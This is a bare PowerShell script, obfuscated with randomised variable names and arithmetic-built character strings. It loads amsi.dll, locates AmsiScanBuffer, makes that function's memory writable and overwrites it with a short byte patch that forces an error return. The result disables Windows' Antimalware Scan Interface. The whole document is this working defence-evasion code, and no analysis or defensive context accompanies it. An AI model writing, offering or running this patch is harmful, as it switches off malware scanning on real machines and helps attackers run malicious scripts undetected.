```powershell
$ynfhj = @"
using System;
using System.Runtime.InteropServices;
public class ynfhj {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr epfkrh, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ynfhj
$gjrnhhu = [ynfhj]::LoadLibrary("$([CHAr]([byte]0x61)+[chAr](109*41/41)+[cHAr](115*88/88)+[char](105+33-33)+[CHAR](10+36)+[chaR]([BYTe]0x64)+[cHaR](108)+[CHAR](108*49/49))")
$veratw = [ynfhj]::GetProcAddress($gjrnhhu, "$([CHaR]([bYTE]0x41)+[cHAR](83+26)+[chAR](46+69)+[chAr]([bYte]0x69)+[chaR]([BYte]0x53)+[chaR]([ByTe]0x63)+[ChAr](69+28)+[cHaR]([bYTE]0x6e)+[Char]([BYTE]0x42)+[cHAR](117)+[Char](102)+[cHAR]([bYte]0x66)+[CHAR]([BytE]0x65)+[ChaR]([bYTE]0x72))")
$p = 0
$qcjh = "0xB8"
[ynfhj]::VirtualProtect($veratw, [uint32]5, 0x40, [ref]$p)
$fkyv = "0xC3"
$gbjf = "0x57"
$iton = "0x07"
$wran = "0x00"
$bgml = "0x80"
$uggea = [Byte[]] ($qcjh,$gbjf,$wran,$iton,+$bgml,+$fkyv)
$mom = [System.Runtime.InteropServices.Marshal]
$mom::Copy($uggea, 0, $veratw, 6)
```